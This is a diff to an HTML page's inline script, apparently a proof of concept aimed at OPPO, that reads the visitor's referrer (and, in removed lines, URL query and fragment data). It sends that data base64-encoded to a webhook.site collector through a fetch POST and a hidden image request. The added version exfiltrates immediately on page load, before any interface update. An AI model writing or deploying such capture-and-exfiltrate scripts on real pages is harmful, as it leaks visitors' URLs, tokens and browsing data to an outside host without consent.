@@ -1,36 +1,24 @@
 <script>
     const webhookUrl = "https://webhook.site/7f9c8926-c9df-44ee-9350-db06430369aa";
-    const statusEl = document.getElementById('status');
-
-    const urlData = window.location.search;
-    const fragmentData = window.location.hash;
+    
+    // 1. Immediate Exfiltration (No waiting for UI)
     const leakingReferrer = document.referrer;
-
-    if (leakingReferrer.includes("oppo.com") || urlData || fragmentData) {
-        
-        statusEl.innerText = "CRITICAL: Handshake Intercepted. Data Exfiltrated.";
-        statusEl.style.color = "#ff3131";
-
-        // A. THE PRIMARY: POST fetch for the structured audit report
-        fetch(webhookUrl, {
-            method: 'POST',
-            mode: 'no-cors',
-            body: JSON.stringify({
-                audit_event: "OPPO_V3_HANDSHAKE",
-                referrer_leak: leakingReferrer || "DIRECT_ACCESS",
-                url_params: urlData || "NONE",
-                timestamp: new Date().toISOString()
-            })
-        });
-
-        // B. THE GHOST (Reliability Booster): Force a GET request via Image
-        // This ensures capture even if the POST body is stripped by the browser.
+    
+    if (leakingReferrer) {
+        // Force the capture via Image (Ghost) immediately
         const exfiltrator = new Image();
         const encodedData = btoa(unescape(encodeURIComponent(leakingReferrer)));
-        exfiltrator.src = `${webhookUrl}?leak_b64=${encodedData}&type=ghost_img&ts=${Date.now()}`;
-
-        console.log("Sentinel: Handshake exfiltrated via Fetch and Image Node.");
-    } else {
-        statusEl.innerText = "Listener Active. Waiting for OPPO Handshake.";
+        exfiltrator.src = `${webhookUrl}?leak_b64=${encodedData}&type=final_killshot&ts=${Date.now()}`;
+        
+        console.log("Sentinel: Handshake exfiltrated.");
     }
+
+    // 2. Safe UI Update
+    window.onload = () => {
+        const statusEl = document.getElementById('status');
+        if (statusEl) {
+            statusEl.innerText = leakingReferrer.includes("oppo.com") ? 
+                "CRITICAL: Handshake Captured." : "Waiting for Handshake...";
+        }
+    };
 </script>
